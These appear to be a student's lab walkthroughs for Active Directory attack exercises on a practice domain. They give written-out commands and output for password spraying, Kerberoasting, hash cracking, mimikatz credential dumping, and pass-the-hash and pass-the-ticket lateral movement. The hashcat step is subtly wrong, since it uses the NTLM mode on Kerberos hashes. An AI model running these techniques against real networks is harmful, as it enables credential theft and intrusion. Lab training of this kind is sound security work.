# Random Walkthrough - One
**Section 22.2.5**

#### CrackMapExec (NetExec):

Spraying the password against all the IPs in the domain.

```zsh
# provide a hosts.txt file or an ip-range with the '-' character
cme 192.168.216.70-75 -u users.txt -p passwords.txt -d corp.com --continue-on-success
```

```text
# OUTPUT

SMB         192.168.216.73  445    FILES04          [+] corp.com\meg:VimForPowerShell123! 
SMB         192.168.216.72  445    WEB04            [+] corp.com\meg:VimForPowerShell123! 
SMB         192.168.216.70  445    DC1              [+] corp.com\meg:VimForPowerShell123! 
SMB         192.168.216.74  445    CLIENT74         [+] corp.com\meg:VimForPowerShell123! 
SMB         192.168.216.75  445    CLIENT75         [+] corp.com\meg:VimForPowerShell123! 
```

Once we know that `meg:VimForPowerShell123!` has access on DC1 (192.168.216.70), we can use `impacket's GetUserSPNs.py` to dump hashes:

```bash
impacket-GetUserSPNs -outputfile hashes.krb -dc-ip 192.168.216.70 'corp.com/meg:VimForPowerShell123!'
```

We can cat out the `hashes.krb` to get the hashes now which we can use for cracking.

```bash
hashcat -a 0 -m 1000 hashes /usr/share/wordlist/rockyou.txt -r /usr/share/hashcat/append1.rule # 1000 for NTLM
```

Finally, spray the new passwords with CME like we did before, but update the passwords file. This time we could see that 

```text
SMB         192.168.216.70  445    DC1              [+] corp.com\backupuser:DonovanJadeKnight1 (Pwn3d!)
```

DC1 has been pwned using the Donovan password and the backupuser. Which means we can get System32 access on the DC.

---

# Random Walkthrough - Two
**Section 23.2.2 Capstone Exercise 4 - Playing with Tickets**

Logged into the system as the 'leon' user, ran the `klist` command. 

The `klist` command shows that there is a cached ticket for user `dave` on `web04` which means that he has an account on `web04`.
Next we open up mimikatz and perform a pass the hash attack from current user `jeffadmin` to user `dave` on domain `corp.com`.

**Step 1**
```powershell
# dump hashes & find an entry for user dave
.\mimikatz.exe
sekurlsa::logonpasswords
# or
lsadump::sam
# once ntlm hash for dave is found, perfrom a pass the hash
sekurlsa::pth /user:dave /domain:corp.com /ntlm:[DAVE_NTLM]
```
**Step 2**
```powershell
# in the new shell try to use the web04 share since dave has access to it.
net use \\web04 # just to poke it. The output will say command completed successfully.
net view \\web04 # will list the contents of the share. Output will say \backup
dir \\web04\backup\ # can also use 'ls' but dir is used in cmd
type \\web04\backup\file.txt # to view the contents of the file. Can also use 'cat' or 'Get-Content'
copy \\web04\backup\file.txt output_file.txt # to copy and save the contents in the CWD.
```

---

# Random Walkthrough - Three
**Section 23.2.2 Capstone Exercise 3 - Lateral Movement to Files04**
Joined `client74` as `leon` with the password `HomeTaping199!`. 
Listed out a bunch of users with the `net user /domain` command to see what users are available.

Created a `users.txt` file on kali machine to create a list of domain users & created a `passwords.txt` file to enter the one password I have -  `HomeTaping199!`.
Used CrackMapExec (now NetExec) to see if this password is reused on any other machine from the domain -
```bash
cme 192.168.237.70-76 -u users -p passwords -d corp.com --continue-on-success | grep -i '[+]' # to filter only important results
```

```text
SMB         192.168.237.74  445    CLIENT74         [+] corp.com\leon:HomeTaping199! (Pwn3d!)
SMB         192.168.237.76  445    CLIENT76         [+] corp.com\leon:HomeTaping199! 
SMB         192.168.237.75  445    CLIENT75         [+] corp.com\leon:HomeTaping199! 
SMB         192.168.237.72  445    WEB04            [+] corp.com\leon:HomeTaping199! 
SMB         192.168.237.73  445    FILES04          [+] corp.com\leon:HomeTaping199! (Pwn3d!)
SMB         192.168.237.70  445    DC1              [+] corp.com\leon:HomeTaping199! 
```

This password has been used by `leon` on a bunch of other systems. Take a note of this, and move on. Also, he has admin rights on `files04` & `client74`.

On `client74` enter mimikatz and export all the tickets using the `sekurlsa::tickets /export` command and find the ticket in the CWD that has some association with `files04` or the user `leon`.
Pass this ticket and get a command shell with more privs.
```powershell
kerberos::ptt [0;27c4c3]-0-0-40a10000-leon@cifs-files04.kirbi
misc::cmd
```

In the resulting shell, view the contents of the files and get `proof.txt`.

- A big thing to note here, is that upon re-doing the machine, it was found that I didn't really have to pass the ticket or the hash. Just knowing through `cme` that `leon` has admin privs on `files04` was enough. I just had to list the file share with `net view \\files04` and get the flag from `type \\files04\backup\C:\Users\Administrator\Desktop\proof.txt`.

---

# Random Walkthrough - Four